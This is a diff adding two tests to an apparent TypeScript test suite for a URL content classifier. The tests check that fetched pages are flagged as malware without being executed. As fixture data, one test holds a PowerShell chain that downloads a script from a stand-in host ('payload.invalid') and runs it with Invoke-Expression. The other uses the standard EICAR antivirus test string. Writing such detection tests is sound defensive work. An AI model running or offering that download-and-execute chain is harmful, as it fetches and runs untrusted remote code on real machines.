@@ -82,6 +82,52 @@ describe("destination-analysis coordinator", () => {
     });
   });
 
+  it("classifies actual fetched malicious text as malware and keeps ordinary text benign without executing either", async () => {
+    const malicious = "https://malicious-content.example.test/payload";
+    const benign = "https://ordinary-content.example.test/help";
+    const eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
+    const fetchImpl = vi.fn(async (url: string) => fetched(
+      url,
+      url === malicious
+        ? `<html><body><pre>${eicar}</pre></body></html>`
+        : "<html><body>Administrator documentation discusses safe software updates and account help.</body></html>",
+    ));
+    const coordinator = createDestinationAnalysisCoordinator({
+      fetchImpl,
+      cacheKey: Buffer.alloc(32, 8),
+    });
+
+    const result = await coordinator.analyze(envelope([malicious, benign]));
+
+    expect(result.results[0]).toMatchObject({
+      classification: "malware",
+      hasPasswordField: false,
+    });
+    expect(result.results[0]?.detail).toMatch(/never executed/i);
+    expect(result.results[1]?.classification).toBe("benign");
+    expect(result.escalatedToHighRisk).toBe(true);
+  });
+
+  it("classifies a deterministic PowerShell download/decode/execute chain as malware without relying on URL reputation", async () => {
+    const url = "https://unknown-hash.example.test/content";
+    const body = [
+      "<html><body><pre>",
+      "powershell.exe -EncodedCommand SQBFAFgA",
+      "$wc = New-Object Net.WebClient",
+      "$payload = $wc.DownloadString('https://payload.invalid/a')",
+      "Invoke-Expression $payload",
+      "</pre></body></html>",
+    ].join("\n");
+    const coordinator = createDestinationAnalysisCoordinator({
+      fetchImpl: vi.fn(async () => fetched(url, body)),
+      cacheKey: Buffer.alloc(32, 9),
+    });
+
+    const result = await coordinator.analyze(envelope([url]));
+    expect(result.results[0]?.classification).toBe("malware");
+    expect(result.escalatedToHighRisk).toBe(true);
+  });
+
   it("coalesces simultaneous identical destinations and serves later calls from the shared cache", async () => {
     const fetchImpl = vi.fn(async (url: string) => {
       await new Promise((resolve) => setTimeout(resolve, 2));
